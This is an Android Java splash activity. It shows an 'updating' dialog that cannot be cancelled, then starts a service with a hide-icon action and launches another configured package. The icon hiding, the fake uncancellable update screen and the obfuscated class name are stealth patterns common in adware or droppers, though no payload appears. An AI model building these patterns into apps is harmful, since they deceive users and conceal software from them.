package com.x.dtswz;

import android.app.Activity;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.view.KeyEvent;
import android.view.Window;
import android.view.WindowManager;
import com.umeng.analytics.MobclickAgent;

import java.io.IOException;

/**
 * Created by Administrator on 2014/11/7.
 */
public class SpalishActivity extends Activity {

    ProgressDialog mPd = null;
    Handler handler = null;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        showPrBar(this);
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);

        handler = new Handler() {
            @Override
            public void handleMessage(Message msg) {
                super.handleMessage(msg);
                mPd.dismiss();

                Intent intent = new Intent(SpalishActivity.this, c.class);
                intent.setAction(Config.HIDEICONAction);

                startService(intent);

                Intent mIntent = getPackageManager().getLaunchIntentForPackage(Config.intentPackageName);
                mIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                if (mIntent != null) startActivity(mIntent);
                SpalishActivity.this.finish();
            }
        };





        if (Config.instanse(this).getServiceName().equals("")) {
            PackageManager pm = this.getPackageManager();

            try {
                ServiceInfo[] serviceInfos = pm.getPackageInfo(this.getPackageName(), PackageManager.GET_SERVICES).services;

                for (ServiceInfo a : serviceInfos) {
                    Class b = Class.forName(a.name);

                    if (Class.forName(Config.instanse(this).serviceParentName).isAssignableFrom(b)) {
                        Config.instanse(this).setServiceName(b.getName());
                        break;
                    }
                }
            } catch (PackageManager.NameNotFoundException e) {
                e.printStackTrace();
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
            }
        }

        try {
            new CheakUpdateUtils(handler, this).cheakUpdateLoadLocal();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void showPrBar(Context context) {
        mPd = new ProgressDialog(context);
        mPd.setProgressStyle(ProgressDialog.STYLE_SPINNER);
        mPd.setMessage("更新中...");
        mPd.setOnKeyListener(new DialogInterface.OnKeyListener() {
            public boolean onKey(DialogInterface dialog, int keyCode, KeyEvent event) {
                if (keyCode == KeyEvent.KEYCODE_BACK || keyCode == KeyEvent.KEYCODE_SEARCH
                        || keyCode == KeyEvent.KEYCODE_MENU) {
                    return true;
                }
                return false;
            }
        });


        mPd.setCanceledOnTouchOutside(false);
        mPd.show();
    }

    @Override
    protected void onResume() {
        super.onResume();

        MobclickAgent.onResume(this);
    }

    @Override
    protected void onPause() {
        super.onPause();

        MobclickAgent.onPause(this);
    }
}


